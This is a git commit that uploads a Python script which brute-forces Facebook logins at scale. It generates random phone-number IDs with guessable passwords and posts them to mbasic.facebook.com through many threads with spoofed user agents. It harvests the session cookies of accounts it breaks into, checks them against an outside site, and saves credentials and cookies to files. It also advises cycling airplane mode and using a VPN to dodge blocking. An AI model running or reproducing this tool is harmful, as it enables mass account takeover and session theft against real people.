104df1246bdbd114539c21872518e888e54559fc
liton007ddd <mdlitonislam525@gmail.com>
2025-07-27 00:22:09 +0600

    Add files via upload

---
+++ ssss.py
@@ -0,0 +1,156 @@
+#WRITTEN BY ARAFAT#
+"""SCRIPT MAKE BY ARAFAT"""
+"""MY CRASH TOMA"""
+"""TOMER JONNO AI TA"""
+#__________________{ MODULE }___________________#
+import random
+import string
+import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re,pycurl,io
+from bs4 import BeautifulSoup
+from os import path
+import os,base64,zlib,pip,urllib
+import requests,bs4,mechanize
+from os import system as clr
+from bs4 import BeautifulSoup as sop
+from pip._vendor import requests as requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+#___________________{ COLOR }___________________#
+A = '\033[1;91m'
+R = '\033[1;33m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+#──────────────{ LOOP }──────────────#
+loop = 0;oks = [];cps = [];id = []
+#──────────────{ COLOUR }──────────────#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
+#──────────────{ LINEX }──────────────#
+def clear():os.system('clear');print(logo);linex()
+def linex():print(f'\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+#__________________{ TALK SYSTEM }______________#
+os.system('espeak -b 1000 "WELCOME TO FREE SCRIPT IS THIs sceipt send by kalyan king"')
+os.system('espeak -b 1000 "Teligerm tem name ox cyber team"')
+os.system("xdg-open https://t.me/+LRlET_sIrUcxMTk1")
+os.system("xdg-open https://t.me/+LRlET_sIrUcxMTk1")
+#──────────────{ NORMAL-UA-FOR-M8 }──────────────#
+ugen=[]
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+for xd in range(5000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+#──────────────{ LOGO }──────────────#
+logo = f"""
+{YELLOW}┏┓┳┓┏┓┏┓┏┓┏┳┓  ┏┓┏┓  ┏┳┓┏┓┳┳┓┏┓
+{WHITE}┣┫┣┫┣┫┣ ┣┫ ┃    ┃┃    ┃ ┃┃┃┃┃┣┫
+{YELLOW}┛┗┛┗┛┗┻ ┛┗ ┻   ┗┛┗┛   ┻ ┗┛┛ ┗┛┗          SC SEND BY > KALYAN KING
+"""
+#_________________{ MENU }___________________#
+def menu():
+	clear()
+	print('\033[1;31m[\033[1;32m1\033[1;31m]\x1b[38;5;46m RANDOM CLONEING');print('\033[1;31m[\033[1;32m2\033[1;31m]\x1b[38;5;46m FILE 🗃️ CLONEING   [COMING SOON]');print('\033[1;31m[\033[1;32m3\033[1;31m]\x1b[38;5;46m EXIT');linex();toma = input(f"\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m CHOICE : ")
+	if toma in ["1","a","A","01"]:
+		__bdx__()
+	if toma in ["2","b","02"]:
+		print("coming Soon")
+		menu()
+	if toma in ['03','3']:exit()
+	else:menu()
+#_________________{ TOMA }___________________#
+def __bdx__():
+    user=[]
+    clear()
+    print(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m EXAMPLE : 016 |•| 017 |•| 018 |•| 019');linex();simcode=input(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m CHOICE : ')
+    clear()
+    print(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m EXAMPLE : 1000 |•| 2000 |•| 3000 |•| 4000');linex()
+    try:
+        limit=int(input(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m CHOICE : '))
+    except ValueError:
+        limit=50000
+    clear()
+    print(f"\033[1;31m[\033[1;32m1\033[1;31m]\x1b[38;5;46m METHOD M1 [HOST] ")
+    print(f"\033[1;31m[\033[1;32m2\033[1;31m]\x1b[38;5;46m METHOD M2 [NORMAL] ");linex();toma = input(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m CHOICE : ')
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as ARAFATxTOMAx:
+        clear()
+        tl=str(len(user))
+        print(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m RANDOM UID : {tl} ');print(f'\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m SIM simcode   : {simcode} ');print(f"\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m USE AIRPLANE MODE EVERY 5 MINITS ");print(f"\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m IF NO RESULTS USE 1.1.1.1 VPN ");linex()
+        for love in user:
+            ids=simcode+love
+            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],]
+            if toma in ['1','2']:ARAFATxTOMAx.submit(__PICCHI_BOU_TOMA__,ids,passlist)
+    print('');print(f'\n\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');print(f"\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m CLONING PROCESS COMPLETE ");print(f"\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m TOTAL OK ID :{A} {len(oks)}");print(f"\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m TOTAL CP ID :{R} {len(cps)}");print(f'\n\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');exit()
+#──────────────{ AMR PICCHI BOU TOMA }──────────────#
+def __PICCHI_BOU_TOMA__(ids,passlist):
+    global oks,cps,loop
+    try:
+        for pas in passlist:
+            session=requests.Session()
+            sys.stdout.write(f'\r\r\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46mARAFATxTOMA\033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46m {Y}{loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "pass":pas,
+            "login":"Log In"}
+            pron_star={'Host': 'mbasic.facebook.com','method':'POST','scheme':'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-GB,en;q=0.9','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24","Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"Infinix X6515"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36','viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = re.findall('c_user=(.*);xs', coki)[0]
+                xz = requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text
+                if "LIVE" in xz:
+                    print(f'\r\r\ARAFATxTOMA_OK| {ids} | {pas} ')
+                    print(f'https://www.facebook.com/profile.php?id={uid}')
+                    os.system('espeak -b 1000 "ok txt"')
+                    print(f'\r\r\x1b[38;5;46m033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46mCOOKIES {YELLOW}{coki} ')
+                    open('/sdcard/ARAFATxTOMA-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
+                    oks.append(ids)
+                    break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                ids = "1000"+coki1[0:11]
+                print(f'\r\r{R}033[1;31m[\033[1;32m!\033[1;31m]\x1b[38;5;46mARAFATxTOMA_CP| {ids} | {pas} ')
+                os.system('espeak -b 1000 "cp txt"')
+                open('/sdcard/ARAFATxTOMA-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#──────────────{ END }──────────────#
+menu()
